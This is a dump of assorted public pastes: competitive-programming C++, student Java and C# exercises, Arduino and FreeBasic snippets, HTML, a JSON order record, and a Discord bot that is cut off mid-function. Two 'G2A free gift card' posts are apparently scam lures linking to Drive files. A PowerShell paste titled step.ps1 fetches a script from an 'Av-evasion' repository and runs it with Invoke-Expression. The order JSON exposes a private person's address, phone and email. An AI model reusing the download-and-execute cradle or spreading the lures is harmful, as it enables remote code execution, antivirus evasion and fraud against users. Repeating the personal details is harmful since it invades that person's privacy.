id,title,username,language,date,content
EqVXj0kU,Untitled,Josif_tepe,C++,Thursday 9th of May 2024 01:03:28 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int maxn = 1e6 + 10;
const int INF = 2e9;
int closing_bracket[maxn];

vector<int> segment_tree[3 * maxn];
vector<int> merge_two_nodes(vector<int> & a, vector<int> & b) {
    int i = 0, j = 0;
    vector<int> c;
    while(i < (int) a.size() and j < (int) b.size()) {
        if(a[i] <= b[j]) {
            c.push_back(a[i]);
            i++;
        }
        else {
            c.push_back(b[j]);
            j++;
        }
    }
    while(i < (int) a.size()) {
        c.push_back(a[i]);
        i++;
    }
    while(j < (int) b.size()) {
        c.push_back(b[j]);
        j++;
    }
    return c;
}
void build_tree(int L, int R, int node) {
    if(L == R) {
        segment_tree[node].push_back(closing_bracket[L]);
    }
    else {
        int middle = (L + R) / 2;
        build_tree(L, middle, 2 * node);
        build_tree(middle + 1, R, 2 * node + 1);
        segment_tree[node] = merge_two_nodes(segment_tree[2 * node], segment_tree[2 * node + 1]);
    }
}
// L R i L R j L R 
int query(int L, int R, int node, int i, int j) {
    if(R < i or j < L) {
        return 0;
    }
    if(i <= L and R <= j) {
        return (int) (lower_bound(segment_tree[node].begin(), segment_tree[node].end(), j + 1) - segment_tree[node].begin());
    }
    int middle = (L + R) / 2;
    return query(L, middle, 2 * node, i, j) + query(middle + 1, R, 2 * node + 1, i, j);
}
int main() {
    ios_base::sync_with_stdio(false);
    string s;
    cin >> s;

    stack<int> st;
    for(int i = 0; i < (int) s.size(); i++) {
        closing_bracket[i] = INF;
    }
    for(int i = 0; i < (int) s.size(); i++) {
        if(s[i] == '(') {
            st.push(i);
        }
        else {
            if(!st.empty()) {
                closing_bracket[st.top()] = i;
                st.pop();
            }
        }
    }
    int n = (int) s.size();
    build_tree(0, n - 1, 1);

    int q;
    cin >> q;
    for(int i = 0; i < q; i++) {
        int a, b;
        cin >> a >> b;

        a--; b--;

        cout << query(0, n - 1, 1, a, b) * 2 << ""\n"";
    }
    
    
    return 0;
}
"
6d1LDdsn,Untitled,Rodunskiy,C#,Thursday 9th of May 2024 12:52:46 PM CDT,"using System;

namespace CSLight
{
    public class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();

            int number = 1;
            int startNumber = 2;
            int power = 0;
            int maxNumberRandom = 100;
            int numberRandom = random.Next(maxNumberRandom);

            while (number < numberRandom) 
            {
                power++;
                number *= startNumber;
            }

            Console.WriteLine($""Сгенерированное число: {numberRandom}\n"" +
                $""Минимальная степень двойки, превосходящая рандомное число: {power}\n"" +
                $""Число в степени:{number}"");
        }
    }
}

"
9XA72ZR9,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Thursday 9th of May 2024 12:50:59 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
09 May 2024"
ymh51uwj,LCD Text rev_01,pleasedontcode,Arduino,Thursday 9th of May 2024 12:44:44 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: LCD Text
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-09 17:44:05

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* This code will breathalyzer with a library liquid */
	/* cristal_I2c with  address 0x27 and measurements of */
	/* 12x2 ; and make calculate the level of alcohol in */
	/* grams; with connections from MQ3 to Arduino= VCC */
	/* to 5V, 6ND to 6ND, A6 to A0; Arduino to LCD =6ND t */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>	//https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t display_LCD1602I2C_I2C_PIN_SDA_A4		= A4;
const uint8_t display_LCD1602I2C_I2C_PIN_SCL_A5		= A5;
const uint8_t display_LCD1602I2C_I2C_SLAVE_ADDRESS		= 0x27;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(0x27, 12, 2);  // set the LCD address to 0x27 for a 12 chars and 2 line display

void setup(void)
{
	// put your setup code here, to run once:
	lcd.init();                      // initialize the lcd 
	lcd.backlight();
	lcd.setCursor(3, 0);
	lcd.print(""Hello, world!"");
	lcd.setCursor(2, 1);
	lcd.print(""Ywrobot Arduino!"");
	lcd.setCursor(0, 2);
	lcd.print(""Arduino LCM IIC 2004"");
	lcd.setCursor(2, 3);
	lcd.print(""Power By Ec-yuan!"");
}

void loop(void)
{
	// put your main code here, to run repeatedly:
}
"
kdbj8mGW,Untitled,Josif_tepe,C++,Thursday 9th of May 2024 12:21:18 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int maxn = 2e5 + 10;
int next_idx[maxn];

vector<int> segment_tree[3 * maxn];
vector<int> merge_two_nodes(vector<int> & a, vector<int> & b) {
    int i = 0, j = 0;
    vector<int> c;
    while(i < (int) a.size() and j < (int) b.size()) {
        if(a[i] <= b[j]) {
            c.push_back(a[i]);
            i++;
        }
        else {
            c.push_back(b[j]);
            j++;
        }
    }
    while(i < (int) a.size()) {
        c.push_back(a[i]);
        i++;
    }
    while(j < (int) b.size()) {
        c.push_back(b[j]);
        j++;
    }
    return c;
}
void build_tree(int L, int R, int node) {
    if(L == R) {
        segment_tree[node].push_back(next_idx[L]);
    }
    else {
        int middle = (L + R) / 2;
        build_tree(L, middle, 2 * node);
        build_tree(middle + 1, R, 2 * node + 1);
        segment_tree[node] = merge_two_nodes(segment_tree[2 * node], segment_tree[2 * node + 1]);
    }
}
// L R i L R j L R 
int query(int L, int R, int node, int i, int j) {
    if(R < i or j < L) {
        return 0;
    }
    if(i <= L and R <= j) {
        return (int) segment_tree[node].size() - (lower_bound(segment_tree[node].begin(), segment_tree[node].end(), j + 1) - segment_tree[node].begin());
    }
    int middle = (L + R) / 2;
    return query(L, middle, 2 * node, i, j) + query(middle + 1, R, 2 * node + 1, i, j);
}
int main() {
    ios_base::sync_with_stdio(false);
    int n, q;
    cin >> n >> q;
    for(int i = 0; i < n; i++) {
        next_idx[i] = n;
    }
    vector<pair<int, int>> v(n);
    for(int i = 0; i < n; i++) {
        cin >> v[i].first;
        v[i].second = i;
    }
    sort(v.begin(), v.end());

    for(int i = 0; i < n - 1; i++) {
        if(v[i].first == v[i + 1].first) {
            next_idx[v[i].second] = v[i + 1].second;
        }
    }
    build_tree(0, n - 1, 1);
    
    
    for(int i = 0; i < q; i++) {
        int a, b;
        cin >> a >> b;
        a--; b--;

        cout << query(0, n - 1, 1, a, b) << endl;
    }

    
    return 0;
}
"
ipNrfPdX,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 9th of May 2024 12:13:11 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_220275.pdf

Working as of:
09 May 2024"
fHLsYRXV,Untitled,Mysoft,FreeBasic,Thursday 9th of May 2024 11:56:41 AM CDT,"sub CountDown( as long iCount )
  for N as long = iCount to 0 step-1
    sleep 1000,1
  next N
end sub

sub PrintSquare( iWid as long , iHei as long , cChar as ubyte )
  for iH as long = 0 to iHei-1
    for iW as long = 0 to iWid-1
      print chr(cChar);
    next iH
  next iW
end sub
  
sub CheckPassword( sPass as string )
  if sPass<>""password""
    print ""Yay, proceed!""
  else
    print ""Bad password!""
  end if
end sub

function IsEven( iNum as long ) as boolean
  if (iNum and 1) >< 0 then return false
  return true
end function

function Uppercase( iChar as long ) as long
  return iif( iChar>=asc(""a"") andalso iChar <= asc(""b"") , (iChar+32) , (iChar)
end function"
2bfy45uN,RSA encryption code,PadmaJS,Erlang,Thursday 9th of May 2024 11:14:34 AM CDT,"import java.util.*;

public class RSAEncryption {
  RSAEncryption() {
    Scanner sc = new Scanner(System.in);
    System.out.print(""Enter a prime number for p: "");
    int p = sc.nextInt();
    System.out.print(""Enter a prime number for q: "");
    int q = sc.nextInt();
    int n = p * q;
    int phi = (p - 1) * (q - 1);
    int d, e;
    do {
      System.out.print(""Enter value of public key e: "");
      e = sc.nextInt();
    } while (RSAEncryption.getGCD(e, phi) != 1);

    for (d = 1; d < phi; d++) {
      if ((e * d) % phi == 1) {
        break;
      }
    }

    System.out.print(""Enter message: "");
    int message = sc.nextInt();

    int encrypted = RSAEncryption.modPow(e, n, message);
    System.out.println(""Encrypted message:"" + encrypted);

    int decrypted = RSAEncryption.modPow(d, n, encrypted);
    System.out.println(""Decrypted message: "" + decrypted);
  }

  static int getGCD(int a, int b) {
    while (b != 0) {
      int temp = b;
      b = a % b;
      a = temp;
    }
    return a;
  }

  static int modPow(int exp, int mod, int base) {
    int result = 1;
    base = base % mod;
    for (int i = 0; i < exp; i++) {
      result = (result * base) % mod;
    }
    return result;
  }

  public static void main(String[] args) {
    new RSAEncryption();
  }
}"
yK7uqcSQ,Untitled,Mysoft,FreeBasic,Thursday 9th of May 2024 11:02:55 AM CDT,"Function CheckLimit( Number as long , Maximum , Minimum as long  ) as boolean
  if Number >= Minimum andalso Number <= Minimum then return true
  return false
end function"
fcY1RLBE,stack queue deque,LEGEND2004,C++,Thursday 9th of May 2024 10:42:25 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long

signed main()
{
    ios_base::sync_with_stdio(0);
    cin.tie(0);

    /*
    stack<int> s;
    s.push(x); // x elave eleyir
    s.top(); // en son (ustdeki) element
    s.pop(); // en son (ustdeki) elementi sil
    s.size(); // olcusu
    s.empty(); // bosdurmu?
    */
    /*
    stack<int> s;
    s.push(5);
    s.push(7);
    s.push(2); // 5 7 2

    cout << s.size() << '\n';

    cout << s.top() << '\n'; // 2
    s.pop();
    cout << s.top() << '\n'; // 7
    s.pop();
    cout << s.top() << '\n'; // 5
    s.pop();
    cout << (s.size() == 0) << '\n';

    while(!s.empty()){
        cout << s.top() << '\n';
        s.pop();
    }

*/
    /*
    queue<int> q;
    q.push(x); // x elave eleyir
    q.front(); // en ilk (soldaki) element
    q.pop(); // en ilk (soldaki) element sil
    q.size(); // olcusu
    q.empty(); // bosdurmu?
    */
    /*
    queue<int> q;
    q.push(5);
    q.push(7);
    q.push(2); // 7 2

    cout << q.size() << '\n'; // 3
    cout << q.front() << '\n'; // 5
    q.pop();
    cout << q.front() << '\n'; // 7
    q.pop();
    cout << q.front() << '\n'; // 2


    while(!q.empty()){
        cout << q.front() << '\n';
        q.pop();
    }
    */
    /*
    deque<int> q;
    q.size(); // olcusu
    q.empty(); // bosdurmu?
    //front ...   back
    q.front(); // soldaki element
    q.push_front(x); // x sola elave
    q.pop_front(); // soldakini sil

    q.back(); // sagdaki element
    q.push_back(x); // x saga elave
    q.pop_back(); // en sagdaki sil
    */
    // big o notation
    // O(1)
    // + - * /
    /*
    // O(n)
    for(int i = 1; i <= 2 * n; i++){
        // O(1)
    }

    // O(n * n)
    for(int i = 1; i <= n; i++){
        for(int j = 1; j <= n; j++){

        }
    }
    */

    // 2 * n * n + 5 * n --> O(n * n)
    // 1 sec ~ 10^8 operations

    /*
    deque<int> q;
    q.push_front(5);
    q.push_back(7);
    q.push_front(2);
    q.push_back(9);
    q.push_front(1);
    // front .. ..  back
    // 1 2 5 7 9

    for(int i = 0; i < q.size(); i++){
        cout << q[i] << "" "";
    }
    cout << '\n';

    for(int i : q)
        cout << i << "" "";
    cout << '\n';

    cout << q.front() << '\n'; // 1
    q.pop_back();
    cout << q.front() << '\n'; // 1
    cout << q.back() << '\n'; // 7
    q.pop_back();
    cout << q.back() << '\n'; // 5
    q.pop_front();
    cout << q.front() << '\n'; // 2
    cout << q.size() << '\n'; // 2
*/
}
"
R94Zv141,getLootCrate.sqf,kerbo_,SQF,Thursday 9th of May 2024 10:14:03 AM CDT,"# create a default Antistasi loot box near the player
_box = createVehicle[""Box_IND_Wps_F"", position player];
clearWeaponCargoGlobal _box;   
clearMagazineCargoGlobal _box;  
clearItemCargoGlobal _box;  
clearBackpackCargoGlobal _box;
[_box] call A3A_fnc_initObject;
"
X4ZjvQjN,border circle,bstefano79,HTML,Thursday 9th of May 2024 10:12:16 AM CDT,"<!DOCTYPE html>
<html lang=""it"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Bordo Circolare Progressivo</title>
    <style>
        .circle-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px;
        }

        .outer-circle {
            width: 220px; 
            height: 220px;
            border-radius: 50%;
            background: conic-gradient(red 0% 0%, black 0% 100%);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .inner-circle {
            width: 200px;  
            height: 200px;
            background-color: #f0f0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .circle-content {
            font-family: Arial, sans-serif;
            font-size: 18px;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class=""circle-wrapper"">
        <div class=""outer-circle"">
            <div class=""inner-circle"">
                <div id=""circle"" class=""circle-content"">0%</div>
            </div>
        </div>
    </div>
    <input type=""range"" min=""0"" max=""100"" value=""0"" id=""rangeInput"" style=""width: 100%;"">
    <script>
        const outerCircle = document.querySelector('.outer-circle');
        const rangeInput = document.getElementById('rangeInput');

        rangeInput.addEventListener('input', function() {
            let percentage = this.value;
            outerCircle.style.background = `conic-gradient(red 0% ${percentage}%, black ${percentage}% 100%)`;
            const c = document.getElementById(""circle"").innerHTML=percentage+""%"";
        });
    </script>
</body>
</html>"
ax2EJ0cB,Untitled,Matimampusluanjay,Lua,Thursday 9th of May 2024 10:07:56 AM CDT,"U know where?
I'm here to be cook
I'm
I'm
I'm
I'm 
Not a
Not a
Crook
Crook
Girl and know i'm taking what not your
Taking what not you
Taking what not you
Girl and know i'm taking what not your
Taking what not your
Taking what not your"
i6MyPqUc,step.ps1,evi1ginx,PowerShell,Thursday 9th of May 2024 09:13:19 AM CDT,"﻿# URL to download safe file
$scriptUrl = ""https://github.com/salahgeek/LAB/blob/main/LAS/Av-evasion/8443.ps1""
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent"
KPy9Aq7K,Fetch info from PlayPilot,DanielFrank,JavaScript,Thursday 9th of May 2024 08:26:38 AM CDT,"<script type=""text/javascript"">
    function scrapePlayPilot() {
        var PlayPilotURL = document.getElementById('<%= txtPlayPilotURL.ClientID %>').value;
        console.log('PlayPilot URL entered:', PlayPilotURL);

        $.get(PlayPilotURL, function (data) {
            // Create a temporary element to parse the HTML content
            var tempElement = document.createElement('div');
            tempElement.innerHTML = data;

            // Find the anchor tag with IMDb URL
            var imdbAnchor = tempElement.querySelector('a.link[href*=""imdb.com""]');
            if (imdbAnchor) {
                var imdbURL = imdbAnchor.href;
                console.log('Scraped IMDb URL:', imdbURL);
                var txtIMDbURL = document.getElementById('<%= txtIMDbURL.ClientID %>');
                if (txtIMDbURL && !txtIMDbURL.value) {
                    // Only set the IMDb URL if the field is empty
                    txtIMDbURL.value = imdbURL;
                }
            } else {
                console.log('IMDb URL not found in the PlayPilot page.');
            }

            // Find YouTube URLs based on their context
            var youtubeLinks = tempElement.querySelectorAll('a[href*=""youtube.com""]');
            youtubeLinks.forEach(function (youtubeLink) {
                var parentElement = youtubeLink.parentElement;
                if (parentElement && parentElement.classList.contains('video-block')) {
                    var youtubeURL = youtubeLink.href;
                    console.log('Scraped YouTube URL:', youtubeURL);
                    var txtTrailerURL = document.getElementById('<%= txtTrailerURL.ClientID %>');
                    if (txtTrailerURL && !txtTrailerURL.value) {
                        // Only set the YouTube URL if the field is empty
                        txtTrailerURL.value = youtubeURL;
                    }
                }
            });

            if (!txtTrailerURL.value) {
                console.log('YouTube URL not found on the PlayPilot page.');
            }
        });
    }
</script>"
VXc3hS2Y,Untitled,sambacar,JSON,Thursday 9th of May 2024 08:18:59 AM CDT,"#request
{
  ""id"": ""100003767500000000"",
  ""order_number"": ""100003767500000000"",
  ""order_date"": ""2024-05-09T13:14:56"",
  ""status"": ""open"",
  ""customer"": {
    ""contact_name"": ""Petar Sambolek"",
    ""first_name"": ""Petar"",
    ""last_name"": ""Sambolek"",
    ""street"": ""Ulica Svete Ane 57"",
    ""postcode"": ""31000"",
    ""city"": ""Osijek"",
    ""phone"": ""0923051110"",
    ""e_mail"": ""sambolek.petar@gmail.com""
  },
  ""items"": [
    {
      ""position"": 1,
      ""product"": {
        ""ean_code"": ""3858893611806"",
        ""name"": ""OMRON M3 tlakomjer + adapter""
      },
      ""quantity"": 1,
      ""price"": 92.23
    },
    {
      ""position"": 2,
      ""product"": {
        ""sku"": ""dostava""
      },
      ""quantity"": 1,
      ""price"": ""0.00""
    }
  ],
  ""payment"": {
    ""status"": ""pending"",
    ""method"": ""wire_transfer""
  },
  ""discount_amount"": ""0.0000""
}

#response
[R005] Invalid [price] data type for order row [id:] [position:2] [] []"
WWV593Pb,Filmovi (Bakurski),niske,Java,Thursday 9th of May 2024 08:15:27 AM CDT,"public class ZadFilmovi{
	
	public static void main (String[] args) {
		SpisakFilmova Movies = new SpisakFilmova();
		Movies.unesiFilm(""Interstelar"");
			Movies.unesiGlumca(""Dusan"", ""Interstelar"");
			Movies.unesiGlumca(""Dusan"", ""Interstelar"");
			Movies.unesiGlumca(""Jovan"", ""Interstelar"");
			
		Movies.unesiFilm(""Superman"");
			Movies.unesiGlumca(""Mila"", ""Superman"");
			Movies.unesiGlumca(""Mila"", ""Superman"");
			Movies.unesiGlumca(""Maks"", ""Superman"");
			//Movies.unesiGlumca(""Jovan"", ""Superman"");
			
		Movies.unesiFilm(""Iron man"");
			Movies.unesiGlumca(""Milan"", ""Iron man"");
			Movies.unesiGlumca(""Zoran"", ""Iron man"");
			Movies.unesiGlumca(""Dusan"", ""Iron man"");
			//Movies.unesiGlumca(""Jovan"", ""Iron man"");
		
		Movies.unesiFilm(""Spajdermen"");
			Movies.unesiGlumca(""Jovan"", ""Spajdermen"");
			Movies.unesiGlumca(""Milan"", ""Spajdermen"");
			Movies.unesiGlumca(""Zoran"", ""Spajdermen"");
			Movies.unesiGlumca(""Dusan"", ""Spajdermen"");
			
		Movies.unesiFilm(""Zombie"");
			Movies.unesiGlumca(""Jovan"", ""Zombie"");
			Movies.unesiGlumca(""Milan"", ""Zombie"");
			Movies.unesiGlumca(""Zoran"", ""Zombie"");
			Movies.unesiGlumca(""Dusan"", ""Zombie"");
			
			Movies.unesiGlumca(""TEST"", """");
			
		System.out.println(Movies);
		
		Movies.izbrisiFilmove(""Jovan"");
		//Movies.izbrisiFilmove(""Jovan"");
		
		System.out.println(""\n"" + Movies);
	}
}

class SpisakFilmova{
		
		//Film
		class Film{
			String ime;
			Film veza;
			Glumci sadrzaj;
			
			public Film(String ime){
				this.ime = ime;
				this.veza = null;
				this.sadrzaj = null;
			}
			
			public String toString(){
				if (sadrzaj == null) // OVO MI JE CHATGPT REKAO :(
					return ime + "": Nema glumaca"";
					
				Glumci tek = sadrzaj;
				String s = ime + "": "" + tek.imePrezime;
				tek = tek.veza;
				
				while(tek != null){
					s += "", "" + tek;
					tek = tek.veza;
				}
				
				return s;
			}
		}
		
		//Glumci
		class Glumci{
			String imePrezime;
			Glumci veza;
			
			public Glumci(String s){
				this.imePrezime = s;
				this.veza = null;
			}
			
			public String toString(){
				return imePrezime + """";
			}
		}
		
		Film prviFilm;
		
		//Metode:
		
		//Dodavanje filmva
		public boolean proveraFilmova(String cilj){
			Film tek = prviFilm;
			
			while(tek != null){
				if(cilj.equalsIgnoreCase(tek.ime)){
					return true;
				}
				
				tek = tek.veza;
			}
			
			return false;
		}
		
		public void unesiFilm(String ime){
			if(!proveraFilmova(ime)){
				Film tek = prviFilm;
				prviFilm = new Film(ime);
				prviFilm.veza = tek;
			}
		}
		
		//Dodavanje glumaca
		public boolean proveraGlumaca(String cilj, String imeFilma){
			Film tekFilm = prviFilm;
			
			while(tekFilm != null){
				if(tekFilm.ime == imeFilma)
					break;
					
				tekFilm = tekFilm.veza;
			}
			
			if(tekFilm != null){
				Glumci tekGlumac = tekFilm.sadrzaj;
				
				while(tekGlumac != null){
					if(cilj.equalsIgnoreCase(tekGlumac.imePrezime))
						return true;
				
					tekGlumac = tekGlumac.veza;
				}
				
				tekFilm = tekFilm.veza;
			}
			
			return false;
		}
		
		public void unesiGlumca(String ime, String film){
			if(!proveraGlumaca(ime, film)){
				Film tek = prviFilm;
				
				while(tek != null){
					if(tek.ime == film){
						Glumci tekGlumci = tek.sadrzaj;
						tek.sadrzaj = new Glumci(ime);
						tek.sadrzaj.veza = tekGlumci;
						break;
					}
					
					tek = tek.veza;
				}
			}
		}
		
		//Izbrise prvo filmove na pocetku liste, pa onda ostale
		public void izbrisiFilmove(String glumac){
			if(prviFilm == null){
				System.out.println(""Nema filmova"");
			} else {
				
				while(prviFilm != null){
					Glumci tekGlumac = prviFilm.sadrzaj;
					boolean pomocna = true;
					
					while(tekGlumac != null){
						if(tekGlumac.imePrezime.equalsIgnoreCase(glumac)){
							prviFilm = prviFilm.veza;
							pomocna = false;
							break;
						}
						
						tekGlumac = tekGlumac.veza;
					}
					
					if(pomocna)
						break;
				}
				
			
				if(prviFilm != null){
					Film tekFilm = prviFilm.veza;
					Film prethodni = prviFilm;
					
					while(tekFilm != null){
						Glumci tekGlumac = tekFilm.sadrzaj;
						
						while(tekGlumac != null){
							if(tekGlumac.imePrezime.equalsIgnoreCase(glumac)){
								prethodni.veza = tekFilm.veza;
								break;
							}
							
							tekGlumac = tekGlumac.veza;	
						}
						
						prethodni = tekFilm;
						tekFilm = tekFilm.veza;
					}
				}
			}
		}
		
		
		//Ispis
		public String toString(){
			String s = ""Spisak filmova:"";
			
			if (prviFilm == null) // OVO MI JE CHATGTP REKAO :(
				return s + "" Nema filmova"";

			Film tek = prviFilm;
			
			while (tek != null){
				s += ""\n"" + tek;
				tek = tek.veza;
			}
			
			return s;
		}
}
"
rkNiPeUp,information,tomtomvader298,JavaScript,Thursday 9th of May 2024 07:42:41 AM CDT,"const { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const db = require('../database.js');
const teaGreen = require('../teaGreen.js');
//

module.exports = {
    data: new SlashCommandBuilder()
        .setDefaultMemberPermissions(PermissionFlagsBits.SendMessages)
        .setDMPermission(false)
        .setName('pet')
        .setDescription('Adopt, Play, Grow')
        .addSubcommand(subcommand =>
            subcommand
                .setName('adopt')
                .setDescription('Adopt A Pet!')
                .addStringOption(option => option.setName('chosen-name').setDescription('Name Your Pet').setRequired(true))
                .addStringOption(option =>
                    option.setName('pet-type-option')
                        .setDescription('Select A Animal As Your Pet')
                        .addChoices(
                            { name: 'Cat', value: 'Cat' },
                            { name: 'Dog', value: 'Dog' },
                            { name: 'Fish', value: 'Fish' },
                            { name: 'Bird', value: 'Bird' },
                            { name: 'Rabbit', value: 'Rabbit' },
                            { name: 'Hamster', value: 'Hamster' },
                            { name: 'Guinea Pig', value: 'Guinea Pig' },
                            { name: 'Turtle', value: 'Turtle' },
                            { name: 'Ferret', value: 'Ferret' },
                            { name: 'Snake', value: 'Snake' },
                            { name: 'Lizard', value: 'Lizard' },
                            { name: 'Gerbil', value: 'Gerbil' },
                            { name: 'Hedgehog', value: 'Hedgehog' },
                            { name: 'Chinchilla', value: 'Chinchilla' },
                            { name: 'Parrot', value: 'Parrot' },
                            { name: 'Hermit Crab', value: 'Hermit Crab' },
                            { name: 'Sugar Glider', value: 'Sugar Glider' },
                            { name: 'Axolotl', value: 'Axolotl' },
                            { name: 'Gecko', value: 'Gecko' },
                            { name: 'Mouse', value: 'Mouse' },
                            { name: 'Frog', value: 'Frog' },
                            { name: 'Snail', value: 'Snail' },
                            { name: 'Betta Fish', value: 'Betta Fish' },
                            { name: 'Rat', value: 'Rat' },
                        )
                        .setRequired(true))
                .addStringOption(option =>
                    option.setName('animal-stage-option')
                        .setDescription('Select A Animal Stage')
                        .addChoices(
                            { name: 'Newborn', value: 'Newborn' },
                            { name: 'Adult', value: 'Adult' },
                            { name: 'Elder', value: 'Elder' },
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('feed')
                .setDescription('Feed Your Pet')
                .addStringOption(option =>
                    option.setName('food-option')
                        .setDescription('Select A Food To Give Your Pet')
                        .addChoices(
                            { name: 'Wet Food', value: 'Wet Food' },
                            { name: 'Dry Food', value: 'Dry Food' },
                            { name: 'Animal Treats', value: 'Animal Treats' }
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('play')
                .setDescription('Play With Your Pet')
                .addStringOption(option =>
                    option.setName('toy-option')
                        .setDescription('Select A Toy To Give Your Pet')
                        .addChoices(
                            { name: 'Ball', value: 'Ball' },
                            { name: 'Rope', value: 'Rope' },
                            { name: 'Laser Pointer', value: 'Laser Pointer' }
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('information')
                .setDescription('Pet Information')
        )

    ,
    async execute(interaction) {
        await interaction.deferReply()

        if (interaction.options.getSubcommand() === 'adopt') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                interaction.editReply({ content: `You Already Adopted A Pet` })
            } else {
                const petNameProvided = interaction.options.getString('chosen-name');
                const chosenAnimal = interaction.options.getString('pet-type-option')
                const animalStage = interaction.options.getString('animal-stage-option')

                const adoptionCertificateEmbed = new EmbedBuilder().setColor(teaGreen)
                    .setTitle('New Pet')
                    .setDescription(`
            # Congrats ${interaction.user.globalName ?? interaction.user.username}, You Adopted ${petNameProvided}
            `).addFields(
                        { name: `Name Provided`, value: `${petNameProvided}` },
                        { name: `Type Of Animal`, value: `${chosenAnimal}` },
                        { name: `Stage`, value: `${animalStage}` }
                    )

                const superPetNameCreation = [
                    { name: 'PetName', value: `${petNameProvided}` }
                ];
                const superPetTypeCreation = [
                    { name: 'PetType', value: `${chosenAnimal}` }
                ];
                const superPetStageCreation = [
                    { name: 'PetStage', value: `${animalStage}` }
                ];
                await interaction.editReply({ content: null, embeds: [adoptionCertificateEmbed], polls: null, files: [], components: [], ephemeral: true, tts: false, fetchReply: false })
                await db.set(`petname_${interaction.user.id}_${interaction.guild.id}`, superPetNameCreation)
                await db.set(`pettype_${interaction.user.id}_${interaction.guild.id}`, superPetTypeCreation)
                await db.set(`petstage_${interaction.user.id}_${interaction.guild.id}`, superPetStageCreation)
                await db.set(`petadopted_${interaction.user.id}_${interaction.guild.id}`, true)
            }


        }

        if (interaction.options.getSubcommand() === 'feed') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const foodOption = interaction.options.getString('food-option');

                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return petNameFromDatabase = 'Cannot Find Name [Internal Error]';
                }

                let author = await db.get(`fedpettimeout_${interaction.user.id}_${interaction.guild.id}`);
                let timeout = 600000; //Set 10 minutes in milliseconds
                if (author !== null && timeout - (Date.now() - author) > 9000) {
                    let time = timeout - (Date.now() - author);
                    let hours = Math.floor(time / (60 * 60 * 1000)); // Calculate hours from milliseconds
                    time -= hours * 60 * 60 * 1000; // Subtract the hours in milliseconds
                    let minutes = Math.floor(time / (60 * 1000));
                    time -= minutes * 60 * 1000;
                    let seconds = Math.floor(time / 1000);
                    let timedout = new EmbedBuilder()
                        .setTitle(""Timed Out"")
                        .setDescription(`${interaction.user.globalName ?? interaction.user.username} You Have Already Fed ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} Recently.\nTime Left: \`${minutes}m:${seconds}s\``)
                        .setColor(teaGreen)
                        .setFooter({ text: 'Go Play With Your Pet!' })
                        .setTimestamp();
                    interaction.editReply({ embeds: [timedout] });
                } else {
                    const petfedTotal = await db.get(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`) 
                    let amountOfTimesFedPet = 0;

                    if (petfedTotal) {
                        amountOfTimesFedPet = petfedTotal + 1; // Increment the existing count
                    } else {
                        amountOfTimesFedPet = 1; // Set to 1 if not tracked
                    }

                    const fedPetEmbed = new EmbedBuilder().setColor(teaGreen).setTitle(`Pet Fed`)
                        .setDescription(`
                # ${interaction.user.globalName ?? interaction.user.username} You have fed ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} with ${foodOption}, They are now full
                `)
